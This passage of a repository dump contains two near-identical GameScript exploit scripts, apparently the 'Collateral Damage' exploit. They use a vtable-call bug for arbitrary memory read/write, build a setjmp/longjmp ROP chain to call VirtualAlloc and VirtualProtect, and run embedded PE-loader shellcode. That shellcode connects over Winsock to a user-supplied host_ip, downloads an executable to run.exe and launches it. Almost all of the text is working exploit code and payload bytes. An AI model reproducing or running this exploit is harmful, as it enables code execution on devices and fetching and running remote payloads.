0x17, 0x41, 0x8D, 0x4, 0x72, 0xF, 0xB7, 0x4, 0x1, 0x25, 0xFF, 0x3F, 0x0, 0x0, 0x41, 0x8D, 0x4, 0x80, 0x8B, 0x4, 0x1, 0x48, 0x1, 0xC8, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x1, 0x13, 0xA, 0x0, 0x13, 0x1, 0x21, 0x0, 0xC, 0x30, 0xB, 0x50, 0xA, 0x70, 0x9, 0x60, 0x8, 0xC0, 0x6, 0xD0, 0x4, 0xE0, 0x2, 0xF0, 0x1, 0xC, 0x8, 0x0, 0xC, 0x30, 0xB, 0x50, 0xA, 0x70, 0x9, 0x60, 0x8, 0xC0, 0x6, 0xD0, 0x4, 0xE0, 0x2, 0xF0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
]


// hex printing helper functions
let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}

fn hex_to_num(s) {
	var str_len = len(s)
	var res = 0
	for (var i = 0; i < str_len; i++)
	{
		res = res << 4
		res = res + c2i_map[s[i]]
	}
	return res
}

fn num_to_hex(num, byte_count) {
	if (byte_count > 8) {
		byte_count = 8
	}
	var res = ""
	for (var i = 0; i < byte_count * 2; i++) {
		var idx = (num >> (4 * i)) & 15
		res = i2c_map[idx] + res 
	}
	return res
}

fn num_to_hex8(num) {
	return num_to_hex(num, 1)
}

fn num_to_hex16(num) {
	return num_to_hex(num, 2)
}

fn num_to_hex32(num) {
	return num_to_hex(num, 4)
}

fn num_to_hex64(num) {
	return num_to_hex(num, 8)
}

fn hex_dump(addr, count) {
	for (var i = 0; i < count; i++) {
		if (i > 0 && (i % 16) == 0) {
			printConsole("\n")
		}
		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
		printConsole(num_to_hex8(cur_byte) + " ")
	}
}

fn array_fill(arr) {
	var arr_len = len(arr)
	for (var i = 0; i < arr_len; i++) {
		arr[i] = 0x41
	}
}

fn round_down(val, bound) {
	return floor(val - (val % bound))
}

fn array_compare(a1, a2) {
	if (len(a1) != len(a2)) {
		return false
	}
	var arr_len = len(a1)
	
	for (var i = 0; i < arr_len; i++) {
		if (a1[i] != a2[i]) {
			return false
		}
	}

	return true
}

// shorthand helpers for memory access
fn write8(addr, val) {
	pointerSetUnsignedInteger8Bit(0, addr, val)
}

fn read8(addr) {
	return pointerGetUnsignedInteger8Bit(0, addr)
}

fn write16(addr, val) {
	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
}

fn read16(addr) {
	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
}

fn write32(addr, val) {
	pointerSetAtOffsetUnsignedInteger(0, addr, val)
}

fn read32(addr) {
	return pointerGetAtOffsetUnsignedInteger(0, addr)
}


fn write64(addr, val) {
	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
}

fn read64(addr) {
	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
}

// helper to read a 64-bit val and automatically make it a hex str
fn read64_hex(addr) {
	var val_low = read32(addr)
	var val_high = read32(addr+4)
	return num_to_hex32(val_high) + num_to_hex32(val_low)
}

fn read_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		buf[i] = read8(addr + i)
	}
}

fn write_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		write8(addr+i, buf[i])
	}
}

fn find_bytes(addr, max_len, pattern, buf) {
	for (var i = 0; i < max_len; i++) {
		read_buf(addr + i, buf)
		if (array_compare(pattern, buf)) {
			return addr + i
		}
	}
	return 0
}

fn find64(addr, max_len, v) {
	var offset = 0
	while (1) {
		var temp_val = read64(addr+offset)
		if (temp_val == v) {
			return addr+offset
		}
		offset += 8
	}
	return 0
}

// shorthand funcs
fn ptr_to_num(p) {
	return numberFromRaw64BitUnsignedInteger(p)
}

fn make_cstr(s) {
	var str_len = len(s) + 1
	var s_ptr = globalArrayNew8Bit(s, str_len)
	pointerSetString(s_ptr, 0, s)
	return ptr_to_num(s_ptr)
}

var gs_base = 0
var ntdll_base = 0
var kernelbase_base = 0
var longjmp_ptr = 0
var setjmp_ptr = 0
var gadget_ptr = 0
var gadget_rsp0x48_ptr = 0
var gadget_pushrax_ptr = 0
fn call_native(func_ptr, rcx, rdx, r8, r9) {
	// set this gadget here
	gadget_rsp0x48_ptr = gs_base + 0xE04B
	gadget_pushrax_ptr = gs_base + 0x1F13A
	var call_done = false

	// allocate 0x120 (space for vtable + setjmp data)
	var obj_ptr = globalArrayNew8Bit("call", 0x100)
	var objp = ptr_to_num(obj_ptr)
	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
	var vtp = ptr_to_num(vt_ptr)
	var stack_size = 0x4000
	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
	var stackp = ptr_to_num(stack_ptr)
	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
	var jcp = ptr_to_num(jmpctx_ptr)

	// set up vtable pointers
	write64(vtp+8, setjmp_ptr)
	write64(objp, vtp)

	// trigger vtable call
	slBus_destroy(obj_ptr)

	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)

	// set up our rop chain
	var r10 = 0
	var r11 = 0
	write64(stackp+stack_size-0xA0, rdx)
	write64(stackp+stack_size-0x98, rcx)
	write64(stackp+stack_size-0x90, r8)
	write64(stackp+stack_size-0x88, r9)
	write64(stackp+stack_size-0x80, r10)
	write64(stackp+stack_size-0x78, r11)
	write64(stackp+stack_size-0x70, func_ptr)
	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
	// 0x30 bytes of padding
	write64(stackp+stack_size-0x38, 0x15151515)
	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
	write64(stackp+stack_size-0x28, jcp)
	write64(stackp+stack_size-0x20, longjmp_ptr);
	
	// set up the context to do the longjmp
	write64(vtp+8, longjmp_ptr)
	write64(objp, vtp)
	// rsp
	write64(objp+0x10, stackp+stack_size-0xA0)
	// rip
	write64(objp+0x50, gadget_ptr)
	
	// trigger vtable call
	slBus_destroy(obj_ptr)
	var ret_val = read64(stackp+stack_size-0x68)

	// clean up our objects
	globalArrayDelete("call")
	globalArrayDelete("vtable")
	globalArrayDelete("stack")
	globalArrayDelete("jctx")

	return ret_val
}

fn find_module_base(addr) {
	var search_addr = round_down(addr, 0x10000)	

	while (1) {
		var magic_static = [0x4D, 0x5A]
		var magic_read = [0, 0]
		read_buf(search_addr, magic_read)

		if (array_compare(magic_static, magic_read)) {
			return search_addr
		}
		search_addr -= 0x10000
	}
	return 0
}

fn get_dll_exports(base_addr) {
	var res = {}
	var magic_static = [0x4D, 0x5A]
	var magic_read = [0, 0]
	read_buf(base_addr, magic_read)

	if (!array_compare(magic_static, magic_read)) {
		printConsole("Magic is invalid!\n")
		return res
	}

	
	var e_lfanew = read32(base_addr+0x3c)
	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)

	var num_funcs = read32(exports_addr+0x14)
	var num_names = read32(exports_addr+0x18)

	var funcs_addr = base_addr + read32(exports_addr+0x1c)
	var names_addr = base_addr + read32(exports_addr+0x20)
	var ords_addr = base_addr + read32(exports_addr+0x24)

	for (var i = 0; i < num_names; i++) {
		var name_addr = base_addr + read32(names_addr + (4 * i))
		var name_str = pointerGetSubstring(0, name_addr, 0x20)
		var ordinal = read16(ords_addr + (2 * i))
		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
		res[name_str] = func_addr
		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
	}

	return res
}

var VirtualAlloc_ptr = 0
var VirtualProtect_ptr = 0
fn map_code(code) {
	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
	write_buf(code_addr, code)

	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
	var oldpp = ptr_to_num(oldp_ptr)
	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
	return code_addr
}

fn map_page(addr) {
	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
	return code_addr
}


// create and dump our object to the terminal
var slbus_ptr = slBus_create()
var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)

// get the base of the GameScript module via the vtable
gs_base = read64(slp) - 0x16faf8

ntdll_base = find_module_base(read64(gs_base + 0x125398))
kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))

var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)

// bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)


// get the ntdll & kernel base exports and find VirtualAlloc/Protect
var kernelbase_exports = get_dll_exports(kernelbase_base)
var ntdll_exports = get_dll_exports(ntdll_base)
VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
var VirtualFree_ptr = kernelbase_exports["VirtualFree"]


// allocate our token info buffer
var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
var tinfop = ptr_to_num(tinfo_ptr)

// write the ip to the global page
var global_page = map_page(0x44000000)
pointerSetString(0, global_page, host_ip)

// map the pe loader
var pe_loader_ptr = map_code(pe_loader_code)
var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)

```

`solstice_artifacts/gamescript_autosave_network.txt`:

```txt
//
// Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
//

// !!! PUT YOUR IP BELOW !!!
// EX: var host_ip = "192.168.1.89"
var host_ip = "[YOUR IP HERE]"

// PE loader shellcode
let pe_loader_code = [
233,22,1,0,0,21,0,0,120,22,0,0,15,21,0,0,237,21,0,0,144,22,0,0,237,21,0,0,117,22,0,0,164,22,0,0,0,0,0,0,37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,46,46,92,76,111,99,97,108,83,116,97,116,101,92,114,117,110,46,101,120,101,0,87,83,50,95,51,50,46,100,108,108,0,87,83,65,83,116,97,114,116,117,112,0,87,83,65,67,111,110,110,101,99,116,0,87,83,65,83,111,99,107,101,116,65,0,105,110,101,116,95,97,100,100,114,0,69,120,112,97,110,100,69,110,118,105,114,111,110,109,101,110,116,83,116,114,105,110,103,115,65,0,76,111,97,100,76,105,98,114,97,114,121,65,0,67,114,101,97,116,101,70,105,108,101,65,0,87,114,105,116,101,70,105,108,101,0,82,101,97,100,70,105,108,101,0,86,105,114,116,117,97,108,65,108,108,111,99,0,86,105,114,116,117,97,108,70,114,101,101,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,0,67,108,111,115,101,72,97,110,100,108,101,0,0,0,0,24,0,0,0,0,128,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,87,65,86,65,85,65,84,86,87,85,83,72,129,236,248,2,0,0,72,131,228,240,72,184,75,0,69,0,82,0,78,0,72,141,140,36,152,0,0,0,72,137,1,72,184,69,0,76,0,66,0,65,0,72,137,65,8,72,184,83,0,69,0,46,0,68,0,72,137,65,16,199,65,24,76,0,76,0,102,131,97,28,0,232,124,4,0,0,72,133,192,116,65,72,137,214,72,184,87,0,83,0,50,0,95,0,72,141,140,36,152,0,0,0,72,137,1,72,184,51,0,50,0,46,0,100,0,72,137,65,8,199,65,16,108,0,108,0,102,131,97,20,0,232,64,4,0,0,72,133,192,116,20,72,137,215,235,51,72,184,4,20,0,0,1,0,0,0,233,53,3,0,0,72,141,21,208,254,255,255,72,137,241,232,58,3,0,0,72,141,13,113,254,255,255,255,208,72,137,199,72,133,192,15,132,151,2,0,0,72,141,21,216,254,255,255,72,137,241,232,22,3,0,0,72,137,68,36,120,72,141,21,209,254,255,255,72,137,241,232,2,3,0,0,72,137,68,36,112,72,141,21,201,254,255,255,72,137,241,232,238,2,0,0,72,137,68,36,104,72,141,21,125,254,255,255,72,137,241,232,218,2,0,0,73,137,197,72,141,21,129,254,255,255,72,137,241,232,200,2,0,0,73,137,199,72,141,21,101,254,255,255,72,137,241,232,182,2,0,0,72,137,68,36,88,72,141,21,140,254,255,255,72,137,241,232,162,2,0,0,72,137,68,36,96,72,141,21,10,254,255,255,72,137,241,232,142,2,0,0,72,137,195,72,141,21,205,253,255,255,72,137,249,232,124,2,0,0,72,137,197,72,141,21,209,253,255,255,72,137,249,232,106,2,0,0,73,137,198,72,141,21,180,253,255,255,72,137,249,232,88,2,0,0,72,137,198,72,141,21,184,253,255,255,72,137,249,232,70,2,0,0,72,137,199,72,141,13,85,253,255,255,76,141,164,36,48,2,0,0,76,137,226,65,184,200,0,0,0,255,211,72,131,100,36,48,0,199,68,36,40,128,0,0,0,199,68,36,32,2,0,0,0,76,137,225,186,0,0,0,64,69,49,192,69,49,201,65,255,213,73,137,196,72,141,148,36,152,0,0,0,102,185,2,2,255,213,131,100,36,40,0,72,131,100,36,32,0,185,2,0,0,0,186,1,0,0,0,65,184,6,0,0,0,69,49,201,65,255,214,72,137,197,185,0,0,0,68,255,215,72,141,148,36,136,0,0,0,199,2,2,0,31,144,137,66,4,72,131,98,8,0,72,131,100,36,48,0,72,131,100,36,40,0,72,131,100,36,32,0,72,137,233,65,184,16,0,0,0,69,49,201,255,214,76,141,76,36,68,65,131,33,0,72,141,84,36,72,131,34,0,72,131,100,36,32,0,72,137,233,65,184,4,0,0,0,65,255,215,133,192,15,132,208,0,0,0,139,124,36,72,15,207,49,201,72,137,250,65,184,0,16,0,0,65,185,4,0,0,0,72,139,92,36,120,255,211,72,137,198,72,131,100,36,32,0,76,141,76,36,68,72,137,233,72,137,194,65,137,248,65,255,215,137,193,184,3,0,0,16,133,201,15,132,10,1,0,0,57,124,36,68,15,133,0,1,0,0,72,141,84,36,76,131,34,0,72,131,100,36,32,0,76,141,76,36,68,72,137,233,65,184,4,0,0,0,65,255,215,133,192,116,111,76,137,100,36,80,68,139,108,36,76,65,15,205,49,201,76,137,234,65,184,0,16,0,0,65,185,4,0,0,0,255,211,73,137,196,72,141,92,36,68,77,137,238,77,133,246,126,70,76,137,234,76,41,242,76,1,226,72,131,100,36,32,0,72,137,233,69,137,240,73,137,217,65,255,215,133,192,15,132,133,0,0,0,139,68,36,68,73,41,198,235,207,184,2,0,0,16,235,122,72,184,4,36,0,0,1,0,0,0,235,110,184,4,0,0,16,235,103,76,141,140,36,128,0,0,0,65,131,33,0,72,137,241,72,137,250,65,184,32,0,0,0,255,84,36,104,76,141,140,36,132,0,0,0,65,131,33,0,72,131,100,36,32,0,72,139,124,36,80,72,137,249,76,137,226,69,137,232,255,84,36,88,76,137,225,49,210,65,184,0,128,0,0,255,84,36,112,72,137,249,72,139,124,36,96,255,215,72,137,233,255,215,255,214,235,5,184,5,0,0,16,72,129,196,248,2,0,0,91,93,95,94,65,92,65,93,65,94,65,95,195,65,87,65,86,65,85,65,84,86,87,85,83,102,129,57,77,90,15,133,159,0,0,0,139,65,60,139,132,1,136,0,0,0,68,139,76,1,24,68,139,68,1,28,68,139,92,1,32,68,139,84,1,36,49,192,69,49,228,77,57,204,15,132,142,0,0,0,73,141,124,36,1,68,137,230,65,141,28,179,139,28,25,128,60,25,0,73,137,252,116,223,72,1,203,73,199,199,255,255,255,255,69,49,228,77,137,230,66,128,124,59,1,0,77,141,127,1,77,141,100,36,1,117,236,73,199,197,255,255,255,255,66,128,124,42,1,0,77,141,109,1,117,244,73,137,252,77,57,253,117,163,69,49,255,73,131,238,1,114,26,66,138,44,58,77,141,103,1,66,58,44,59,77,137,231,116,233,73,137,252,235,132,49,192,235,23,65,141,4,114,15,183,4,1,37,255,63,0,0,65,141,4,128,139,4,1,72,1,200,91,93,95,94,65,92,65,93,65,94,65,95,195,86,101,72,139,4,37,96,0,0,0,72,139,80,24,72,131,194,16,49,192,73,137,208,77,139,72,96,77,133,201,116,83,73,199,195,255,255,255,255,49,246,73,137,242,102,67,131,124,89,2,0,77,141,91,1,72,141,118,1,117,236,72,199,198,255,255,255,255,102,131,124,113,2,0,72,141,118,1,117,244,76,57,222,117,30,69,49,219,73,131,234,1,114,31,67,15,183,52,25,102,66,51,52,25,73,131,195,2,102,247,198,223,255,116,229,77,139,0,73,57,208,117,156,235,9,73,139,80,48,184,1,0,0,0,94,195,204,204,204,1,19,10,0,19,1,95,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,12,8,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,1,1,0,1,96,0,0
]


// hex printing helper functions
let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}

fn hex_to_num(s) {
	var str_len = len(s)
	var res = 0
	for (var i = 0; i < str_len; i++)
	{
		res = res << 4
		res = res + c2i_map[s[i]]
	}
	return res
}

fn num_to_hex(num, byte_count) {
	if (byte_count > 8) {
		byte_count = 8
	}
	var res = ""
	for (var i = 0; i < byte_count * 2; i++) {
		var idx = (num >> (4 * i)) & 15
		res = i2c_map[idx] + res 
	}
	return res
}

fn num_to_hex8(num) {
	return num_to_hex(num, 1)
}

fn num_to_hex16(num) {
	return num_to_hex(num, 2)
}

fn num_to_hex32(num) {
	return num_to_hex(num, 4)
}

fn num_to_hex64(num) {
	return num_to_hex(num, 8)
}

fn hex_dump(addr, count) {
	for (var i = 0; i < count; i++) {
		if (i > 0 && (i % 16) == 0) {
			printConsole("\n")
		}
		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
		printConsole(num_to_hex8(cur_byte) + " ")
	}
}

fn array_fill(arr) {
	var arr_len = len(arr)
	for (var i = 0; i < arr_len; i++) {
		arr[i] = 0x41
	}
}

fn round_down(val, bound) {
	return floor(val - (val % bound))
}

fn array_compare(a1, a2) {
	if (len(a1) != len(a2)) {
		return false
	}
	var arr_len = len(a1)
	
	for (var i = 0; i < arr_len; i++) {
		if (a1[i] != a2[i]) {
			return false
		}
	}

	return true
}

// shorthand helpers for memory access
fn write8(addr, val) {
	pointerSetUnsignedInteger8Bit(0, addr, val)
}

fn read8(addr) {
	return pointerGetUnsignedInteger8Bit(0, addr)
}

fn write16(addr, val) {
	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
}

fn read16(addr) {
	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
}

fn write32(addr, val) {
	pointerSetAtOffsetUnsignedInteger(0, addr, val)
}

fn read32(addr) {
	return pointerGetAtOffsetUnsignedInteger(0, addr)
}


fn write64(addr, val) {
	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
}

fn read64(addr) {
	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
}

// helper to read a 64-bit val and automatically make it a hex str
fn read64_hex(addr) {
	var val_low = read32(addr)
	var val_high = read32(addr+4)
	return num_to_hex32(val_high) + num_to_hex32(val_low)
}

fn read_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		buf[i] = read8(addr + i)
	}
}

fn write_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		write8(addr+i, buf[i])
	}
}

fn find_bytes(addr, max_len, pattern, buf) {
	for (var i = 0; i < max_len; i++) {
		read_buf(addr + i, buf)
		if (array_compare(pattern, buf)) {
			return addr + i
		}
	}
	return 0
}

fn find64(addr, max_len, v) {
	var offset = 0
	while (1) {
		var temp_val = read64(addr+offset)
		if (temp_val == v) {
			return addr+offset
		}
		offset += 8
	}
	return 0
}

// shorthand funcs
fn ptr_to_num(p) {
	return numberFromRaw64BitUnsignedInteger(p)
}

fn make_cstr(s) {
	var str_len = len(s) + 1
	var s_ptr = globalArrayNew8Bit(s, str_len)
	pointerSetString(s_ptr, 0, s)
	return ptr_to_num(s_ptr)
}

var gs_base = 0
var ntdll_base = 0
var kernelbase_base = 0
var longjmp_ptr = 0
var setjmp_ptr = 0
var gadget_ptr = 0
var gadget_rsp0x48_ptr = 0
var gadget_pushrax_ptr = 0
fn call_native(func_ptr, rcx, rdx, r8, r9) {
	// set this gadget here
	gadget_rsp0x48_ptr = gs_base + 0xE04B
	gadget_pushrax_ptr = gs_base + 0x1F13A
	var call_done = false

	// allocate 0x120 (space for vtable + setjmp data)
	var obj_ptr = globalArrayNew8Bit("call", 0x100)
	var objp = ptr_to_num(obj_ptr)
	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
	var vtp = ptr_to_num(vt_ptr)
	var stack_size = 0x4000
	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
	var stackp = ptr_to_num(stack_ptr)
	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
	var jcp = ptr_to_num(jmpctx_ptr)

	// set up vtable pointers
	write64(vtp+8, setjmp_ptr)
	write64(objp, vtp)

	// trigger vtable call
	slBus_destroy(obj_ptr)

	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)

	// set up our rop chain
	var r10 = 0
	var r11 = 0
	write64(stackp+stack_size-0xA0, rdx)
	write64(stackp+stack_size-0x98, rcx)
	write64(stackp+stack_size-0x90, r8)
	write64(stackp+stack_size-0x88, r9)
	write64(stackp+stack_size-0x80, r10)
	write64(stackp+stack_size-0x78, r11)
	write64(stackp+stack_size-0x70, func_ptr)
	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
	// 0x30 bytes of padding
	write64(stackp+stack_size-0x38, 0x15151515)
	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
	write64(stackp+stack_size-0x28, jcp)
	write64(stackp+stack_size-0x20, longjmp_ptr);
	
	// set up the context to do the longjmp
	write64(vtp+8, longjmp_ptr)
	write64(objp, vtp)
	// rsp
	write64(objp+0x10, stackp+stack_size-0xA0)
	// rip
	write64(objp+0x50, gadget_ptr)
	
	// trigger vtable call
	slBus_destroy(obj_ptr)
	var ret_val = read64(stackp+stack_size-0x68)

	// clean up our objects
	globalArrayDelete("call")
	globalArrayDelete("vtable")
	globalArrayDelete("stack")
	globalArrayDelete("jctx")

	return ret_val
}

fn find_module_base(addr) {
	var search_addr = round_down(addr, 0x10000)	

	while (1) {
		var magic_static = [0x4D, 0x5A]
		var magic_read = [0, 0]
		read_buf(search_addr, magic_read)

		if (array_compare(magic_static, magic_read)) {
			return search_addr
		}
		search_addr -= 0x10000
	}
	return 0
}

fn get_dll_exports(base_addr) {
	var res = {}
	var magic_static = [0x4D, 0x5A]
	var magic_read = [0, 0]
	read_buf(base_addr, magic_read)

	if (!array_compare(magic_static, magic_read)) {
		printConsole("Magic is invalid!\n")
		return res
	}

	
	var e_lfanew = read32(base_addr+0x3c)
	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)

	var num_funcs = read32(exports_addr+0x14)
	var num_names = read32(exports_addr+0x18)

	var funcs_addr = base_addr + read32(exports_addr+0x1c)
	var names_addr = base_addr + read32(exports_addr+0x20)
	var ords_addr = base_addr + read32(exports_addr+0x24)

	for (var i = 0; i < num_names; i++) {
		var name_addr = base_addr + read32(names_addr + (4 * i))
		var name_str = pointerGetSubstring(0, name_addr, 0x20)
		var ordinal = read16(ords_addr + (2 * i))
		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
		res[name_str] = func_addr
		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
	}

	return res
}

var VirtualAlloc_ptr = 0
var VirtualProtect_ptr = 0
fn map_code(code) {
	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
	write_buf(code_addr, code)

	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
	var oldpp = ptr_to_num(oldp_ptr)
	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
	return code_addr
}

fn map_page(addr) {
	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
	return code_addr
}


// create and dump our object to the terminal
var slbus_ptr = slBus_create()
var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)

// get the base of the GameScript module via the vtable
gs_base = read64(slp) - 0x16faf8

ntdll_base = find_module_base(read64(gs_base + 0x125398))
kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))

var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)

// bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)


// get the ntdll & kernel base exports and find VirtualAlloc/Protect
var kernelbase_exports = get_dll_exports(kernelbase_base)
var ntdll_exports = get_dll_exports(ntdll_base)
VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
var VirtualFree_ptr = kernelbase_exports["VirtualFree"]


// allocate our token info buffer
var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
var tinfop = ptr_to_num(tinfo_ptr)

// write the ip to the global page
var global_page = map_page(0x44000000)
pointerSetString(0, global_page, host_ip)

// map the pe loader
var pe_loader_ptr = map_code(pe_loader_code)
var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)

```